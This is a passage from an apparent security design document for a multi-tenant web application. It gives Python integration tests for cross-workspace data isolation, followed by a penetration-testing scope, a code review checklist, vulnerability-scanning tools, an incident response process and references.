    response = client.get(f"/activities/{activity_b.id}", headers={"Authorization": f"Bearer {token_a}"})
    
    # Assert: 404
    assert response.status_code == 404
```

#### Test Case 4: Authorization Isolation (Privilege Escalation)
```python
def test_cross_workspace_privilege_escalation():
    # Create 2 workspaces
    workspace_a = create_workspace("Team A")
    workspace_b = create_workspace("Team B")
    admin_a = create_user(workspace_a, "admin_a@example.com", role="admin")
    user_b = create_user(workspace_b, "user_b@example.com", role="rep")
    
    # Authenticate as admin in workspace A
    token_a = login(admin_a.email, "password")
    
    # Attempt to access admin endpoint in workspace B
    response = client.post(
        "/import",
        headers={"Authorization": f"Bearer {token_a}"},
        json={"csv_content": "..."}
    )
    
    # Assert: 403 (can import only within their workspace; workspace ID is injected from token)
    assert response.status_code == 403
```

#### Test Case 5: Search Isolation
```python
def test_cross_workspace_search_isolation():
    # Create workspaces with similar contact names
    workspace_a = create_workspace("Team A")
    workspace_b = create_workspace("Team B")
    user_a = create_user(workspace_a, "user_a@example.com")
    
    # Create contacts with same name
    create_contact(workspace_a, name="Acme Corp", email="info@acme-a.com")
    create_contact(workspace_b, name="Acme Corp", email="info@acme-b.com")
    
    # Authenticate as user_a
    token_a = login(user_a.email, "password")
    
    # Search for "Acme"
    response = client.get("/search?q=acme", headers={"Authorization": f"Bearer {token_a}"})
    
    # Assert: Only 1 result (Acme in workspace A)
    assert response.status_code == 200
    results = response.json()
    assert len(results) == 1
    assert results[0]["email"] == "info@acme-a.com"
```

#### Test Case 6: Import Isolation
```python
def test_cross_workspace_import_isolation():
    # Create 2 workspaces
    workspace_a = create_workspace("Team A")
    workspace_b = create_workspace("Team B")
    admin_a = create_user(workspace_a, "admin_a@example.com", role="admin")
    
    # Authenticate as admin in workspace A
    token_a = login(admin_a.email, "password")
    
    # Import contacts into workspace A
    csv_content = "name,email\nJohn Doe,john@example.com"
    response = client.post(
        "/import",
        headers={"Authorization": f"Bearer {token_a}"},
        json={"csv_content": csv_content}
    )
    
    # Assert: Import succeeds in workspace A
    assert response.status_code == 200
    
    # Verify contact is in workspace A only
    contact = response.json()["created"][0]
    response_list = client.get("/contacts", headers={"Authorization": f"Bearer {token_a}"})
    assert len(response_list.json()) == 1
    assert response_list.json()[0]["email"] == "john@example.com"
    
    # Verify contact is NOT visible to workspace B admin
    admin_b = create_user(workspace_b, "admin_b@example.com", role="admin")
    token_b = login(admin_b.email, "password")
    response_list_b = client.get("/contacts", headers={"Authorization": f"Bearer {token_b}"})
    assert len(response_list_b.json()) == 0
```

### Test Suite Organization

```
tests/
  integration/
    test_cross_workspace_isolation.py  # All tests above
    fixtures/
      workspace_fixtures.py  # Helper functions for setup
      auth_fixtures.py  # Login helpers
```

### Continuous Verification

- Run cross-workspace isolation tests in CI/CD pipeline (pre-merge gate)
- Add randomized property-based tests (using `hypothesis`) to generate random workspace/user combinations
- Code review: Any query that doesn't include workspace_id filter is blocked (static analysis tool or manual check)

---

## 7. Security Testing & Validation

### Pre-Launch Security Audit

A third-party security firm should conduct penetration testing 2–4 weeks before MVP launch:

**Scope**:
- API penetration testing (SQL injection, IDOR, privilege escalation, authentication bypass)
- Frontend penetration testing (XSS, CSRF, insecure direct object references)
- Social engineering (phishing, password reset bypass)
- Infrastructure assessment (TLS configuration, database hardening, backup security)

**Deliverables**:
- Detailed report with findings classified by severity (critical, high, medium, low)
- Proof-of-concept for each critical/high finding
- Remediation recommendations
- Re-test after fixes (until zero critical/high findings)

### Code Review Checklist

Every code change touching auth, data access, or privileged operations requires review against:

- [ ] Workspace ID injected and checked in all user-facing queries
- [ ] Role checks on all privileged endpoints
- [ ] No raw SQL (parameterized queries only)
- [ ] No hardcoded credentials or secrets
- [ ] Error messages don't leak sensitive information (e.g., "user not found" vs. "invalid credentials")
- [ ] Rate limiting on brute-force-vulnerable endpoints (login, password reset)
- [ ] CSRF token validation on all POST/PUT/DELETE
- [ ] No console.log or debug output logging sensitive data
- [ ] Frontend escapes user input or uses CSP

### Vulnerability Scanning

- **SAST** (Static Application Security Testing): Run `bandit` (Python) on backend code in CI/CD
- **DAST** (Dynamic Application Security Testing): Run `OWASP ZAP` against deployed MVP
- **Dependency Scanning**: Run `pip-audit` or `Safety` to detect known CVEs in dependencies
- **License Compliance**: Verify no GPL or restrictive licenses in dependencies

---

## 8. Incident Response Plan (P1)

### Security Incident Reporting

**Scope**: Any suspected or confirmed unauthorized access, data breach, or security violation.

**Process**:
1. **Detection**: User reports unusual activity, or automated monitoring triggers alert
2. **Triage**: On-call security engineer investigates within 1 hour
3. **Containment**: If confirmed, take action to stop ongoing attack (reset user tokens, lock account, isolate database)
4. **Notification**: Within 72 hours, notify affected users and legal team; prepare regulatory notification if required
5. **Post-Mortem**: Document root cause and preventive measures

---

## Checklist Summary

- [x] 1. Threat model identifies top 5–10 risks (10 threats detailed)
- [x] 2. Each risk has mitigation strategy: code patterns, testing requirements, infrastructure controls
- [x] 3. Encryption documented: TLS 1.2+, bcrypt 12+, API key rotation strategy
- [x] 4. Audit log contract defined: events, immutability, retention
- [x] 5. GDPR workflows documented: deletion, recovery, auto-purge, data export
- [x] 6. Data export contract (R-8): CSV format, fields, SLA
- [x] 7. Cross-workspace isolation test pattern documented

---

## References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Authorization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
- GDPR: https://gdpr-info.eu/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- CWE Top 25: https://cwe.mitre.org/top25/
- ADR-001: Backend framework (FastAPI selected)
- ADR-005: Authentication provider (hand-rolled JWT)
- ADR-201: GDPR deletion strategy (soft-delete + 90-day grace period)

---

## Downstream Implementation Artifacts

- **API Contract (OpenAPI)**: Document all endpoints with required role, CSRF token requirement, and error codes
- **Database Schema DDL**: Add audit_log table; define immutability constraints
- **Pre-commit Hook**: Enforce `bandit` scan; reject commits with hard-coded secrets
- **CI/CD Pipeline**: Run `pip-audit`, `mypy`, SAST tools before merge
- **Deployment Checklist**: Verify TLS cert, HTTPS redirect, secure headers before launch
- **Monitoring Setup**: Configure alerts for failed auth, privilege escalation attempts, rate-limit violations
- **Runbook**: How to respond to security incidents, rotate keys, restore from backup
- **Support Documentation**: How to handle password resets, account recovery, GDPR deletion requests
